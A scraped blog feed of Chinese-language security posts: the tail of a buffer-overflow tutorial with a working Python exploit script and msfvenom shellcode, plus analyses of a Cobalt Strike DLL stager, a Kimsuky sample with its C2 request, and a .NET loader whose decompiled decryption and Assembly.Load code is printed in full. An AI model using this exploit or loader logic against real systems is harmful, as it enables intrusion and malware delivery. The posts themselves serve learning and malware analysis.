&quot;\x00\x0a&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3v61S.png" alt=""></p><p>寻找第一个jmp ESP的地址，复制内存地址<br><img src="https://z3.ax1x.com/2021/05/07/g3vf7n.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vIhV.png" alt=""></p><p>如上图所示，我们发现JMP ESP地址为080414C3。在更新脚本之前，我们需要了解字节序的概念。</p><p><strong>字节序</strong><br>计算机有两种存储int和float之类的多字节数据类型的方式，这两种类型称为Little Endian和Big Endian。x86被称为Little Endian体系结构。在这种体系结构中，二进制文件的最后一个字节首先存储。在Big Endian中，情况恰恰相反。二进制文件的第一个字节仅在Big Endian体系结构中首先存储。当我们使用x86体系结构时，应将JMP ESP地址转换为Little Endian格式，即”\xC3\x14\x04\x08”。在使用JMP ESP之后，我们需要对漏洞利用进行一些调整。</p><p>（其实就是大端和小端序列的区别，小端序列内存取反，大端序列内存不变）</p><p><strong>NOP指令</strong><br>NOP是一系列无操作指令，负责将CPU的执行流程滑至下一个内存地址。如果我们在shellcode之前加了nop，那么缓冲区的位置就无关紧要，当返回指针碰到NOP滑板时，顾名思义，它将滑动返回地址，直到到达我们的shellcode的开头。 。<br><img src="https://z3.ax1x.com/2021/05/07/g3v71U.png" alt=""></p><p>不同的CPU的NOP值是不同的。在我们的例子中，我们将使用”\x90”。<br>nop指令对应的字节码是90<br><img src="https://z3.ax1x.com/2021/05/07/g3vX7R.png" alt=""></p><h2 id="生成Shellcode"><a href="#生成Shellcode" class="headerlink" title="生成Shellcode"></a>生成Shellcode</h2><pre><code>msfvenom -p windows/exec cmd=calc.exe -b &quot;\x00\x0a&quot; -f py</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vxtx.png" alt=""></p><p>shellcode发送</p><pre><code class="python">import socketoffset=146buf =  b&quot;&quot;buf += b&quot;\xbd\xb9\xb7\x52\x9e\xdb\xd6\xd9\x74\x24\xf4\x58\x33&quot;buf += b&quot;\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8\x45\x55&quot;buf += b&quot;\xa7\x62\x5d\x18\x48\x9b\x9d\x7d\xc0\x7e\xac\xbd\xb6&quot;buf += b&quot;\x0b\x9e\x0d\xbc\x5e\x12\xe5\x90\x4a\xa1\x8b\x3c\x7c&quot;buf += b&quot;\x02\x21\x1b\xb3\x93\x1a\x5f\xd2\x17\x61\x8c\x34\x26&quot;buf += b&quot;\xaa\xc1\x35\x6f\xd7\x28\x67\x38\x93\x9f\x98\x4d\xe9&quot;buf += b&quot;\x23\x12\x1d\xff\x23\xc7\xd5\xfe\x02\x56\x6e\x59\x85&quot;buf += b&quot;\x58\xa3\xd1\x8c\x42\xa0\xdc\x47\xf8\x12\xaa\x59\x28&quot;buf += b&quot;\x6b\x53\xf5\x15\x44\xa6\x07\x51\x62\x59\x72\xab\x91&quot;buf += b&quot;\xe4\x85\x68\xe8\x32\x03\x6b\x4a\xb0\xb3\x57\x6b\x15&quot;buf += b&quot;\x25\x13\x67\xd2\x21\x7b\x6b\xe5\xe6\xf7\x97\x6e\x09&quot;buf += b&quot;\xd8\x1e\x34\x2e\xfc\x7b\xee\x4f\xa5\x21\x41\x6f\xb5&quot;buf += b&quot;\x8a\x3e\xd5\xbd\x26\x2a\x64\x9c\x2c\xad\xfa\x9a\x02&quot;buf += b&quot;\xad\x04\xa5\x32\xc6\x35\x2e\xdd\x91\xc9\xe5\x9a\x6e&quot;buf += b&quot;\x80\xa4\x8a\xe6\x4d\x3d\x8f\x6a\x6e\xeb\xd3\x92\xed&quot;buf += b&quot;\x1e\xab\x60\xed\x6a\xae\x2d\xa9\x87\xc2\x3e\x5c\xa8&quot;buf += b&quot;\x71\x3e\x75\xcb\x14\xac\x15\x22\xb3\x54\xbf\x3a&quot;jmpaddrfess=b&quot;\xc3\x14\x04\x08&quot;nops = b&quot;\x90&quot; * 16buffer=b&quot;A&quot;*offset+jmpaddrfess+nops+buf #填充缓冲区-&gt;jmp到执行ESP的指令（EIP寄存器控制）-&gt; nop指令填充-&gt;shellcode执行buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3xPje.png" alt=""></p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>1.Fuzz造成崩溃的bytes，找到崩溃的寄存器<br>2.崩溃中断后给出的地址复制，计算ESP填充大小<br>3.尝试控制EIP<br>4.寻找错误十六进制坏字节<br>5.shellcode发送执行</p>]]></content>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cobalt Strike的DLL Stager分析</title>
      <link href="/posts/78291ddc.html"/>
      <url>/posts/78291ddc.html</url>
      <content type="html"><![CDATA[<p>参考链接:<a href="https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/" target="_blank" rel="noopener">https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs生成分阶段的dll x64位，丢进IDA分析<br><img src="https://z3.ax1x.com/2021/04/27/gCfujJ.png" alt=""></p><p>DllMain函数:<br>1.CreateThread启动线程调用sub_6BAC16B0函数<br>2.调用sub_6BAC15B2函数<br><img src="https://z3.ax1x.com/2021/04/27/gCfQBR.png" alt=""></p><p>sub_6BAC16B0函数:<br>1.将WInMain函数的dll句柄传入到sub_6BAC1605函数执行<br><img src="https://z3.ax1x.com/2021/04/27/gCflH1.png" alt=""></p><p>sub_6BAC1605函数:<br>1.系统启动以来经过的毫秒数*0x26AA<br>2.拼接获取管道名 -&gt; \.\pipe\MSSE-%d-server （例如：\.\pipe\MSSE-1234-server）。该管道的格式是有据可查的“钴罢工”危害指标<br>3.CreateThread启动线程调用调用StartAddress函数<br><img src="https://z3.ax1x.com/2021/04/27/gCf8N6.png" alt=""></p><p>StartAddress函数:<br>1.调用sub_6BAC1440函数,传入一个指针和nNumberOfBytesToRead变量<br><img src="https://z3.ax1x.com/2021/04/27/gCfG4K.png" alt=""></p><p>sub_6BAC1440函数:<br>1.CreateNamedPipeA创建管道<br>2.ConnectNamedPipe连接管道<br>3.连接成功，WriteFile管道写入shellcode<br>4.CloseHandle关闭句柄（一旦将shellcode写入管道后，先前通过管道打开的句柄就通过闭合CloseHandle。这表明管道的唯一目的是传输加密的Shellcode）<br><img src="https://z3.ax1x.com/2021/04/27/gCfY9O.png" alt=""></p><p>sub_6BAC1512函数:<br>1.读取管道里的shell复制到数组 （一旦管道以只读模式打开，该FillBufferFromPipe函数将继续在shellcode上进行复制，直到使用填充分配的缓冲区ReadFile。缓冲区填满后，将关闭命名管道的句柄CloseHandle并FillBufferFromPipe返回TRUE）<br><img src="https://z3.ax1x.com/2021/04/27/gCft3D.png" alt=""></p><p>sub_6BAC176E函数:<br>1.使用VirtualAlloc更改内存区域权限(MEM_RESERVE|MEM_COMMIT)<br>2.一旦分配了区域，该函数就会在shellcode缓冲区上循环并使用简单的xor操作将每个字节解密到新分配的区域中<br>3.调用sub_6BAC1733函数<br>4.VirtualProtect更改区域页面权限为PAGE_EXECUTE_READ<br>5.CreateThread启动线程调用sub_6BAC1730函数<br><img src="https://z3.ax1x.com/2021/04/27/gCfwDA.png" alt=""></p><p>sub_6BAC1733函数:<br>1.根据判断确定将GetModuleHandleA、GetProcAddress函数地址写入内存（数组）<br><img src="https://z3.ax1x.com/2021/04/27/gCfrUP.png" alt=""></p><p>sub_6BAC1730函数:<br>1.shellcode执行<br><img src="https://z3.ax1x.com/2021/04/27/gCfs4f.png" alt=""></p><p>总结：<br>1.创建管道写shellcode<br>2.从管道读取shellcode复制到数组<br>3.更改内存区域权限(MEM_RESERVE|MEM_COMMIT)，xor解密shellcode，将GetModuleHandleA、GetProcAddress函数地址写入内存，更改区域页面权限为PAGE_EXECUTE_READ<br>4.shellcode执行</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安全客上某样本分析复现</title>
      <link href="/posts/a9492d23.html"/>
      <url>/posts/a9492d23.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1480848896&auto=1&height=66"></iframe><p>原文链接:<a href="https://www.anquanke.com/post/id/208525#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208525#h2-1</a><br>样本hash：ae986dd436082fb9a7fec397c8b6e717<br>app.any.run地址：<a href="https://app.any.run/tasks/c5066e3d-974b-499a-971f-954dbf2d5c5d/" target="_blank" rel="noopener">https://app.any.run/tasks/c5066e3d-974b-499a-971f-954dbf2d5c5d/</a><br><img src="https://z3.ax1x.com/2021/04/26/gS3ai4.png" alt=""></p><h2 id="动态执行分析"><a href="#动态执行分析" class="headerlink" title="动态执行分析"></a>动态执行分析</h2><p>火绒剑动态分析</p><pre><code>* BA_extract_pe 这个动作表示释放PE文* BA_self_copy 表示自我复制* BA_register_autorun 表示应用程序通过注册表将自己写入了开机自启动</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3dJJ.png" alt=""></p><p>网络行为监测<br><img src="https://z3.ax1x.com/2021/04/26/gS3DQ1.png" alt=""></p><p>general-second.org-help.com<br>GET /dl_ex1.png?m=000C292922B0&amp;NOTE=Ni4yIDogOS45fDV8djEuMAo=<br><img src="https://z3.ax1x.com/2021/04/26/gS36eK.png" alt=""></p><p>微步社区查询</p><pre><code>* 属于Kimsukey组织</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3RFe.png" alt=""></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>pestudio查询</p><pre><code>* PE位数:32-bit</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3fWd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS34SA.png" alt=""></p><p>API恶意行为标记<br><img src="https://z3.ax1x.com/2021/04/26/gS3Iyt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS3oOP.png" alt=""></p><p>strings查询<br><img src="https://z3.ax1x.com/2021/04/26/gS3Hw8.png" alt=""></p><p>IDA打开分析，可以直接找到入口点</p><pre><code>* 创建互斥体    * 互斥体存在退出* 调用sub_4011E0()函数* 调用sub_403600()函数* 调用sub_401580()函数* 调用sub_401770()函数* 调用sub_402790()函数* 判断szServerName长度是否大于0* CreateThread创建线程调用StartAddress函数* 调用WaitForSingleObject等待执行完成</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3OYQ.png" alt=""></p><p>sub_4011E0函数分析<br><img src="https://z3.ax1x.com/2021/04/26/gS89mV.png" alt=""></p><p>可以发现静态分析，没办法分析出什么<br><img src="https://z3.ax1x.com/2021/04/26/gS8CwT.png" alt=""></p><p>打算动态分析，先关闭ASLR<br><img src="https://z3.ax1x.com/2021/04/26/gS8FkF.png" alt=""></p><p>先在sub_401040函数下断，得到解密结果，发现解密出后是wininet.dll<br><img src="https://z3.ax1x.com/2021/04/26/gS8kY4.png" alt=""></p><p>进入call下断可以看的跟直白<br><img src="https://z3.ax1x.com/2021/04/26/gS8AfJ.png" alt=""></p><p>解密得到所有内容<br><img src="https://z3.ax1x.com/2021/04/26/gS8e61.png" alt=""><br>结论是该函数<strong>解密加载对应的dll和获取对应dll的函数地址</strong></p><p>sub_403600函数分析（<strong>拷贝到数据路径，添加开机自启</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS8MTO.png" alt=""></p><p>sub_401580函数分析（<strong>遍历网络适配器得到IP或者使用硬盘序列号生成随机数</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS81te.png" alt=""></p><p>sub_401770函数分析（<strong>获取系统版本、处理器版本、兼容性版本、v1.0然后base64编码返回</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS83fH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8tXt.png" alt=""></p><p>sub_402790函数分析<br><img src="https://z3.ax1x.com/2021/04/26/gS80AS.png" alt=""></p><p>sub_402F30动态跟踪分析<br><img src="https://z3.ax1x.com/2021/04/26/gS8spj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8y1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS86cn.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8W7T.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS85h4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8o9J.png" alt=""><br>拼接随机数，请求dl_ex1.png</p><p>请求成功后进入下一步<br><img src="https://z3.ax1x.com/2021/04/26/gS87cR.png" alt=""></p><p>跟踪sub_401AA0函数<br><img src="https://z3.ax1x.com/2021/04/26/gS8LB6.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8jAO.png" alt=""></p><p>到后面发现是使用rundll32启动执行<br><img src="https://z3.ax1x.com/2021/04/26/gS8vND.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某cs读取资源文件样本执行分析</title>
      <link href="/posts/a98e0b02.html"/>
      <url>/posts/a98e0b02.html</url>
      <content type="html"><![CDATA[<p>继续学习样本分析<br>原YouTube视频分析：<a href="https://www.youtube.com/watch?v=deG_-5opR30" target="_blank" rel="noopener">https://www.youtube.com/watch?v=deG_-5opR30</a><br>样本地址：<a href="https://app.any.run/tasks/6cdbb3ea-a272-47d5-b01e-0a41a1ae16f3/" target="_blank" rel="noopener">https://app.any.run/tasks/6cdbb3ea-a272-47d5-b01e-0a41a1ae16f3/</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>下载下来发现是.NET直接丢Dnspy反编译<br><img src="https://z3.ax1x.com/2021/04/14/cy7O9P.png" alt=""></p><p>跟随入口点<br><img src="https://z3.ax1x.com/2021/04/14/cy7vjS.png" alt=""></p><pre><code class="C#">using System;using System.Windows.Forms;namespace WinFormsFirstOne{    // Token: 0x02000013 RID: 19    internal static class Program    {        // Token: 0x06000096 RID: 150 RVA: 0x000068AA File Offset: 0x00004AAA        [STAThread]        private static void Main()        {            Application.EnableVisualStyles();            Application.SetCompatibleTextRenderingDefault(false); //某些控件上定义的属性设置应用程序范围的默认值            Application.Run(new Form1());        }    }}</code></pre><p>跟随第一个函数EnableVisualStyles<br><img src="https://z3.ax1x.com/2021/04/14/cyHSBQ.png" alt=""></p><p>后续跟踪：</p><pre><code class="C#">public static void EnableVisualStyles(){            string text = null;            new FileIOPermission(PermissionState.None) //申请权限            {                AllFiles = FileIOPermissionAccess.PathDiscovery //访问路径本身中的信息。这有助于保护路径中的敏感信息，例如用户名，以及路径中显示的有关目录结构的信息。此值不授予对路径表示的文件或文件夹的访问权限。            }.Assert(); //调用此方法的代码访问受权限需求保护的资源            try            {                text = typeof(Application).Assembly.Location; //读取的资源文件内容            }            finally            {                CodeAccessPermission.RevertAssert();            }            if (text != null)            {                Application.EnableVisualStylesInternal(text, 101);            }}private static void EnableVisualStylesInternal(string assemblyFileName, int nativeResourceID) //EnableVisualStylesInternal函数翻译启用视觉样式内部{            Application.useVisualStyles = UnsafeNativeMethods.ThemingScope.CreateActivationContext(assemblyFileName, nativeResourceID);}////////////////////////public static bool CreateActivationContext(string dllPath, int nativeResourceManifestID) //native Resource Manifest ID(本机资源清单ID){                Type typeFromHandle = typeof(UnsafeNativeMethods.ThemingScope);                bool result;                lock (typeFromHandle)                {                    if (!UnsafeNativeMethods.ThemingScope.contextCreationSucceeded &amp;&amp; OSFeature.Feature.IsPresent(OSFeature.Themes))                    {                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext = default(UnsafeNativeMethods.ThemingScope.ACTCTX);                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.cbSize = Marshal.SizeOf(typeof(UnsafeNativeMethods.ThemingScope.ACTCTX));                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.lpSource = dllPath;                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.lpResourceName = (IntPtr)nativeResourceManifestID;                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.dwFlags = 8U;                        UnsafeNativeMethods.ThemingScope.hActCtx = UnsafeNativeMethods.ThemingScope.CreateActCtx(ref UnsafeNativeMethods.ThemingScope.enableThemingActivationContext); // CreateActCtx函数创建一个激活上下文                        UnsafeNativeMethods.ThemingScope.contextCreationSucceeded = (UnsafeNativeMethods.ThemingScope.hActCtx != new IntPtr(-1));                    }                    result = UnsafeNativeMethods.ThemingScope.contextCreationSucceeded;                }                return result;}</code></pre><p>看完完全不知道真正的东西，返回到入口点查看new From1。发现只是实例化各种窗口的，完全没有有用信息<br><img src="https://z3.ax1x.com/2021/04/14/cyHw4I.png" alt=""></p><p>在一筹莫展的时候，跟着视频走。发现是直接分析资源文件处理函数<br><img src="https://z3.ax1x.com/2021/04/14/cyHD8P.png" alt=""></p><p>跟随到资源文件，可以看到定义的SAS变量<br><img src="https://z3.ax1x.com/2021/04/14/cyHsv8.png" alt=""></p><p>跟随Rate函数（以后找不到函数被使用，可以直接Dnspy对着哪一行右键”分析”）<br><img src="https://z3.ax1x.com/2021/04/14/cyHcDg.png" alt=""></p><p>分析如下：</p><pre><code class="C#">using System;namespace WinFormsFirstOne{    // Token: 0x02000009 RID: 9    internal class Castle    {        // Token: 0x04000032 RID: 50        public static string Ir = &quot;cnJCh&quot;;        // Token: 0x04000033 RID: 51        public static string Iq = &quot;HvXUw&quot;;        // Token: 0x04000034 RID: 52        public static string Le = &quot;Load&quot;;    }}        InvokeMethod = 256,    public static string Select(string s)        {            char[] array = s.ToCharArray();            Array.Reverse(array); //反转数组            return new string(array);        }        // Token: 0x0600006C RID: 108 RVA: 0x00004BD0 File Offset: 0x00002DD0        public string Rate(object[] io)        {            byte[] array = Convert.FromBase64String(FarmDestination.Select(Resources.SAS.Replace(&quot;Quotes_on_Life&quot;, &quot;A&quot;))); //base64解码            Assembly assembly = (Assembly)Type.GetType(&quot;System@@@@@^Reflection@@@@@^Assembly&quot;.Replace(&quot;@@@@@^&quot;, &quot;.&quot;)).InvokeMember(Castle.Le, BindingFlags.InvokeMethod, null, null, new object[]            {                array            }); //调用公开静态函数(加载解码的base64) Assembly assembly = (Assembly)Type.GetType(&quot;System.Reflection.Assembly&quot;).InvokeMember(&quot;Load&quot;,256,null,null,new object[]){array}            MethodInfo o = (MethodInfo)LateBinding.LateGet(assembly.GetType(&quot;Dژ家ycحElj她s.的Fڵ是rn太Wظ&quot;), null, &quot;GetMethod&quot;, new object[]            {                &quot;执ZciGڤjPز&quot;            }, null, null); //获取&quot;Dژ家ycحElj她s.的Fڵ是rn太Wظ&quot;.执ZciGڤjP调用结果            LateBinding.LateGet(o, null, FarmDestination.Select(&quot;ekovnI&quot;), new object[]            {                null,                io            }, null, null);            return &quot;Biara&quot;;        }    }}</code></pre><p>将SAS变量进行base64解码<br>1.将Quotes_on_Life替换为A<br>2.反转base64<br>3.base64解码</p><p><img src="https://z3.ax1x.com/2021/04/14/cyHREj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/14/cyHWUs.png" alt=""></p><p>保存到文件，继续拖到dnspy分析，跟踪调用的 执ZciGڤjPز函数。发现是调用了几个函数后远程加载<br><img src="https://z3.ax1x.com/2021/04/14/cyHf5n.png" alt=""></p><p>跟踪هmyڕDئفTH函数<br>1.获取入口函数程序集所在的文件<br>2.创建一个新的ResourceManager<br>3.返回了个Bitmap<br><img src="https://z3.ax1x.com/2021/04/14/cyH4Cq.png" alt=""></p><p>跟踪بظxئ家g希顾太太Bحه函数<br>（貌似是解密的算法）<br><img src="https://z3.ax1x.com/2021/04/14/cyH580.png" alt=""></p><p>跟踪c商ەڤG首首rءsە函数<br>从gzip流读取数据返回<br><img src="https://z3.ax1x.com/2021/04/14/cyHI2V.png" alt=""></p><p>一般这种情况需要断点Assembly.Load才能获取解密后的结果。然后作者把这个dump出来的文件，直接丢de4dot.exe然后就得到了解密的结果<br><img src="https://z3.ax1x.com/2021/04/14/cyHovT.png" alt=""></p><p>最后确定入口点在（smethod_4函数）：<br><img src="https://z3.ax1x.com/2021/04/14/cyH7KU.png" alt=""></p><pre><code class="C#">using System;using System.Collections.Generic;using System.Drawing;using System.IO;using System.IO.Compression;using System.Reflection;using System.Resources;using System.Text;using System.Threading;namespace ns1{    // Token: 0x02000002 RID: 2    public class GClass0    {        // Token: 0x06000001 RID: 1 RVA: 0x00002064 File Offset: 0x00000264        public static byte[] smethod_0(byte[] byte_0)        {            byte[] result;            using (MemoryStream memoryStream = new MemoryStream(byte_0))            {                byte[] array = new byte[4];                memoryStream.Read(array, 0, 4);                int num = BitConverter.ToInt32(array, 0);                using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))                {                    byte[] array2 = new byte[num];                    gzipStream.Read(array2, 0, num);                    result = array2;                }            }            return result;        }        // Token: 0x06000002 RID: 2 RVA: 0x000020E4 File Offset: 0x000002E4        public static byte[] smethod_1(byte[] byte_0, string string_1) //xor解密        {            byte[] bytes = Encoding.ASCII.GetBytes(string_1); //密钥            int num = (int)(byte_0[byte_0.Length - 1] ^ 112);            byte[] array = new byte[byte_0.Length + 1];            int num2 = 0;            for (int i = 0; i &lt;= byte_0.Length - 1; i++)            {                array[i] = (byte)((int)byte_0[i] ^ num ^ (int)bytes[num2]);                if (num2 == string_1.Length - 1)                {                    num2 = 0;                }                else                {                    num2++;                }            }            Array.Resize&lt;byte&gt;(ref array, byte_0.Length - 1);            return array;        }        // Token: 0x06000003 RID: 3 RVA: 0x00002164 File Offset: 0x00000364        private static byte[] smethod_2(Bitmap bitmap_0)        {            List&lt;byte&gt; list = new List&lt;byte&gt;();            checked            {                int num = bitmap_0.Width - 1;                for (int i = 0; i &lt;= num; i++)                {                    int num2 = bitmap_0.Height - 1;                    for (int j = 0; j &lt;= num2; j++)                    {                        Color pixel = bitmap_0.GetPixel(i, j);                        if (pixel != Color.FromArgb(0, 0, 0, 0))                        {                            list.InsertRange(list.Count, new byte[]                            {                                pixel.R,                                pixel.G,                                pixel.B                            });                        }                    }                }                return list.ToArray();            }        }        // Token: 0x06000004 RID: 4 RVA: 0x00002208 File Offset: 0x00000408        public static Bitmap smethod_3(string string_1, string string_2)        {            ResourceManager resourceManager = new ResourceManager(string_2 + &quot;.Properties.Resources&quot;, Assembly.GetEntryAssembly());            return (Bitmap)resourceManager.GetObject(string_1);        }        // Token: 0x06000005 RID: 5 RVA: 0x0000223C File Offset: 0x0000043C        public static void smethod_4(string string_1, string string_2, string string_3)        {            Thread.Sleep(38000);            byte[] rawAssembly = GClass0.smethod_0(GClass0.smethod_1(GClass0.smethod_2(GClass0.smethod_3(string_1, string_3)), string_2));            Assembly.Load(rawAssembly).EntryPoint.Invoke(0, null);            Environment.Exit(0);        }        // Token: 0x04000001 RID: 1        private string string_0 = &quot;You will face many defeats in life, but never let yourself be defeated.&quot;;    }}</code></pre><p>由于加密太多，过于繁琐。无法看到源代码静态分析执行了什么。只能丢沙箱了看看执行了什么，或者在运行的时候dump .NET内存<br>（最后是释放了个exe在执行）<br>作者使用了MegaDumper工具在运行的时候dump下来的exe：<a href="https://github.com/CodeCracker-Tools/MegaDumper" target="_blank" rel="noopener">https://github.com/CodeCracker-Tools/MegaDumper</a><br><img src="https://z3.ax1x.com/2021/04/14/cybCrD.png" alt=""></p><p>最后丢dnspy得到原始的代码</p><pre><code class="C#">using System;using System.EnterpriseServices;using System.Globalization;using System.IO;using System.Reflection;using System.Runtime.InteropServices;using System.Runtime.Remoting;using System.Text;using System.Threading;// Token: 0x02000003 RID: 3[ComVisible(false)]public class RegSvcs{    // Token: 0x06000005 RID: 5    [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)]    private static extern int SearchPath(string path, string fileName, string extension, int numBufferChars, StringBuilder buffer, int[] filePart);    // Token: 0x06000007 RID: 7 RVA: 0x0000209C File Offset: 0x0000029C    private static RegistrationHelper GetRegistrationHelper(bool bCreateAppDomain, out AppDomain domain)    {        RegistrationHelper result = null;        domain = null;        if (!bCreateAppDomain)        {            result = new RegistrationHelper();        }        else        {            string directoryName = Path.GetDirectoryName(RegSvcs.regConfig.AssemblyFile);            domain = AppDomain.CreateDomain(&quot;RegSvcs&quot;, null, new AppDomainSetup            {                ApplicationBase = directoryName            });            if (domain != null)            {                ObjectHandle objectHandle = domain.CreateInstance(typeof(RegistrationHelper).Assembly.FullName, typeof(RegistrationHelper).FullName);                if (objectHandle != null)                {                    result = (RegistrationHelper)objectHandle.Unwrap();                }            }        }        return result;    }    // Token: 0x06000008 RID: 8 RVA: 0x00002124 File Offset: 0x00000324    private static string FindAssembly(string name)    {        StringBuilder stringBuilder = new StringBuilder(261);        if (RegSvcs.SearchPath(null, name, null, stringBuilder.Capacity + 1, stringBuilder, null) == 0)        {            return null;        }        return stringBuilder.ToString();    }    // Token: 0x06000009 RID: 9 RVA: 0x00002158 File Offset: 0x00000358    private static bool IsAssemblyInGAC(string name)    {        try        {            Assembly assembly = Assembly.Load(name);        }        catch        {            return false;        }        return true;    }    // Token: 0x0600000A RID: 10 RVA: 0x00002188 File Offset: 0x00000388    [MTAThread]    public static int Main(string[] args)    {        int result;        try        {            result = RegSvcs.UnsafeMain(args);        }        catch        {            result = 1;        }        return result;    }    // Token: 0x0600000B RID: 11 RVA: 0x000021B4 File Offset: 0x000003B4    public static int UnsafeMain(string[] args)    {        AppDomain appDomain = null;        RegSvcs.DoConsoleInitialization();        try        {            RegSvcs.ParseArguments(args); //根据命令行做出对应的函数处理            if (RegSvcs.logoOutput)            {                RegSvcs.PrintLogo();            }            if (RegSvcs.regConfig.AssemblyFile != null)            {                string text = RegSvcs.FindAssembly(RegSvcs.regConfig.AssemblyFile);                RegistrationHelper registrationHelper;                if (text != null)                {                    RegSvcs.regConfig.AssemblyFile = text;                    registrationHelper = RegSvcs.GetRegistrationHelper(true, out appDomain);                }                else                {                    if (!RegSvcs.IsAssemblyInGAC(RegSvcs.regConfig.AssemblyFile))                    {                        throw new RegistrationException(Resource.FormatString(&quot;RegSvcs_AssemblyNotFound&quot;, RegSvcs.regConfig.AssemblyFile));                    }                    registrationHelper = RegSvcs.GetRegistrationHelper(false, out appDomain);                }                if (RegSvcs.uninstallApplication)                {                    registrationHelper.UninstallAssemblyFromConfig(ref RegSvcs.regConfig);                    if (RegSvcs.successOutput)                    {                        Console.WriteLine(Resource.FormatString(&quot;RegSvcs_UninstallSuccess&quot;, RegSvcs.regConfig.AssemblyFile));                    }                }                else                {                    registrationHelper.InstallAssemblyFromConfig(ref RegSvcs.regConfig);                    if (RegSvcs.successOutput)                    {                        if (RegSvcs.regConfig.Partition != null &amp;&amp; RegSvcs.regConfig.Application != null)                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_InstallSuccess2&quot;, new string[]                            {                                RegSvcs.regConfig.AssemblyFile,                                RegSvcs.regConfig.Application,                                RegSvcs.regConfig.Partition,                                RegSvcs.regConfig.TypeLibrary                            }));                        }                        else if (RegSvcs.regConfig.Application != null)                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_InstallSuccess&quot;, RegSvcs.regConfig.AssemblyFile, RegSvcs.regConfig.Application, RegSvcs.regConfig.TypeLibrary));                        }                        else                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_NoServicedComponents&quot;));                        }                    }                }            }        }        catch (UsageException ex)        {            if (RegSvcs.logoOutput)            {                RegSvcs.PrintLogo();            }            Console.WriteLine(ex.Message);            return ex.ReturnCode;        }        catch (RegistrationException ex2)        {            string msg;            if (RegSvcs.uninstallApplication)            {                msg = Resource.FormatString(&quot;RegSvcs_UninstallError&quot;);            }            else            {                msg = Resource.FormatString(&quot;RegSvcs_InstallError&quot;);            }            RegSvcs.DumpExceptions(msg, ex2, false);            if (ex2.InnerException != null)            {                if (ex2.InnerException is COMException)                {                    COMException ex3 = (COMException)ex2.InnerException;                    if (ex3.ErrorCode != 0)                    {                        return ex3.ErrorCode;                    }                    return 1;                }            }            else if (ex2.ErrorInfo != null)            {                foreach (RegistrationErrorInfo registrationErrorInfo in ex2.ErrorInfo)                {                    if (registrationErrorInfo.ErrorCode != 0)                    {                        return registrationErrorInfo.ErrorCode;                    }                }            }            return 1;        }        catch (COMException ex4)        {            RegSvcs.DumpExceptions(Resource.FormatString(&quot;RegSvcs_CatalogError&quot;), ex4, false);            if (ex4.ErrorCode != 0)            {                return ex4.ErrorCode;            }            return 1;        }        catch (Exception e)        {            RegSvcs.DumpExceptions(Resource.FormatString(&quot;RegSvcs_UnknownError&quot;), e, true);            return 1;        }        finally        {            if (appDomain != null)            {                AppDomain.Unload(appDomain);            }        }        return 0;    }    // Token: 0x0600000C RID: 12 RVA: 0x000024FC File Offset: 0x000006FC    private static void DoConsoleInitialization()    {        Thread.CurrentThread.CurrentUICulture = CultureInfo.CurrentUICulture.GetConsoleFallbackUICulture(); //当默认的图形用户界面区域不合适时，获取适合控制台应用程序的备用用户界面区域        if (Console.OutputEncoding.CodePage != 65001 &amp;&amp; Console.OutputEncoding.CodePage != Thread.CurrentThread.CurrentUICulture.TextInfo.OEMCodePage &amp;&amp; Console.OutputEncoding.CodePage != Thread.CurrentThread.CurrentUICulture.TextInfo.ANSICodePage) //控制台编码不为UTF-8当前线程页面代码不为xxx则设置        {            